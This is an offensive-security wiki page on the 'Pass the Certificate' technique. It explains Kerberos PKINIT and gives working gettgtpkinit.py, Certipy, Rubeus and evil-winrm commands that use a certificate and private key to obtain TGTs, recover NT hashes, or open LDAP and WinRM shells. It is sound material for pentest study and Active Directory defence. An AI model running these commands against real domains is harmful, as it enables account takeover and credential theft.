# Pass the Certificate

## Theory

The Kerberos authentication protocol works with tickets in order to grant access. An ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to [ASREProast](asreproast.md)). The pre-authentication can be validated symmetrically (with a DES, RC4, AES128 or AES256 key) or asymmetrically (with certificates). The asymmetrical way of pre-authenticating is called PKINIT.

Pass the Certificate is the fancy name given to the pre-authentication operation relying on a certificate (i.e. key pair) to pass in order to obtain a TGT. This operation is often conducted along [shadow credentials](shadow-credentials.md), [AD CS escalation](../ad-cs/) and [UnPAC-the-hash attacks](unpac-the-hash.md).

{% hint style="info" %}
Keep in mind a certificate in itself cannot be used for authentication without the knowledge of the private key. A certificate is signed for a specific public key, that was generated along with a private key, which should be used when relying on a certificate for authentication.

The "certificate + private key" pair is usually used in the following manner

* PEM certificate + PEM private key
* PFX certificate export (which contains the private key) + PFX password (which protects the PFX certificate export)
{% endhint %}

## Practice

{% tabs %}
{% tab title="UNIX-like" %}
#### PKINITtools

From UNIX-like systems, [Dirk-jan](https://twitter.com/\_dirkjan)'s [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools/) tool to request a TGT (Ticket Granting Ticket) for the target object. That tool supports the use of the certificate in multiple forms.

```python
# PFX certificate (file) + password (string, optionnal)
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# Base64-encoded PFX certificate (string) (password can be set)
gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# PEM certificate (file) + PEM private key (file)
gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
```

The ticket obtained can then be used to

* authenticate with [pass-the-cache](ptc.md)
* conduct an [UnPAC-the-hash](unpac-the-hash.md) attack. This can be done with [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools/).
* obtain access to the account's SPN with an S4U2Self. This can be done with [gets4uticket.py](https://github.com/dirkjanm/PKINITtools/blob/master/gets4uticket.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools).

#### Certipy

When using Certipy for Pass-the-Certificate, it automatically does [UnPAC-the-hash](unpac-the-hash.md) to recover the account's NT hash, in addition to saving the TGT obtained.

```bash
certipy auth -pfx <PATH_TO_PFX_CERT> -dc-ip <DC_IP> -username <user> -domain <DOMAIN_FQDN>
```

{% hint style="info" %}
If you have this error:**`KDC_ERR_PADATA_TYPE_NOSUPP`**when requesting PKINIT, it may be an indication that your targeted KDCs do not have certificates with the necessary EKU (Extended Key Usages). \
More specificly, If a KDC must support smart card logon, its certificate must have the `Smart Card Logon` EKU\
\
**You can use your certificate to connect to LDAPS via Schannel.**
{% endhint %}

Authentication via Schannel is also supported by [Certipy](https://github.com/ly4k/Certipy), lt will open a connection to LDAPS and drop into an interactive shell with limited LDAP commands

```bash
certipy auth -pfx <PATH_TO_PFX_CERT> -username <user> -domain <DOMAIN_FQDN> -ldap-shell -ldap-scheme ldaps -dc-ip $DC_IP
[*] Connecting to 'ldaps://10.10.10.10:636'
[*] Authenticated to '10.10.10.10' as: u:CONTOSO.LOCAL\Administrator
Type help for list of commands

# help
```

Certipy's commands don't support PFXs with password. The following command can be used to "unprotect" a PFX file.

```bash
certipy cert -export -pfx <PATH_TO_PFX_CERT> -password <CERT_PASSWORD> -out <unprotected.pfx>
```

#### Evil-WinRm

[Evil-WinRM](https://github.com/Hackplayers/evil-winrm) uses the [WinRM](../../../redteam/pivoting/winrm.md) protocol based on [Windows Management Instrumentation (WMI)](../../../redteam/pivoting/remote-wmi.md) to give us an interactive shell on a Windows host. Winrm Supports PKINIT, so we can authenticate with a certificate.

```bash
evil-winrm -i <TARGET_IP> -c <PATH_TO_PEM_CERT> -k <PATH_TO_PEM_KEY> -S -r <DOMAIN_REALM>
```

Evil WinRM doesn't directly support PFX files and need a PEM certificate and private key. The following commands can be used to convert a PFX file in PEM formats

```bash
# Exctract PEM certificate
openssl pkcs12 -in <PATH_TO_PFX_CERT> -clcerts -nokeys -out <PATH_TO_NEW_PEM_CERT>

# Extrcat PEM key
openssl pkcs12 -in <PATH_TO_PFX_CERT> -nocerts -out <ENC_PEM_KEY>
openssl rsa -in <ENC_PEM_KEY> -out <FINAL_PEM_KEY>
```
{% endtab %}

{% tab title="Windows" %}
From Windows systems, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used to request a TGT (Ticket Granting Ticket) for the target object from a base64-encoded PFX certificate export (with an optional password).

```bash
Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
```

{% hint style="info" %}
PEM certificates can be exported to a PFX format with openssl. Rubeus doesn't handle PEM certificates.

```bash
openssl pkcs12 -in "cert.pem" -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out "cert.pfx"
```
{% endhint %}

{% hint style="info" %}
Certipy uses DER encryption. To generate a PFX for Rubeus, [openssl](https://www.openssl.org/) can be used.

```bash
openssl rsa -inform DER -in key.key -out key-pem.key
openssl x509 -inform DER -in cert.crt -out cert.pem -outform PEM
openssl pkcs12 -in cert.pem -inkey key-pem.key -export -out cert.pfx
```
{% endhint %}

The ticket obtained can then be used to

* authenticate with [pass-the-ticket](ptt.md)
* conduct an [UnPAC-the-hash](unpac-the-hash.md) attack (add the `/getcredentials` flag to Rubeus's asktgt command)
* obtain access to the account's SPN with an S4U2Self.
{% endtab %}
{% endtabs %}
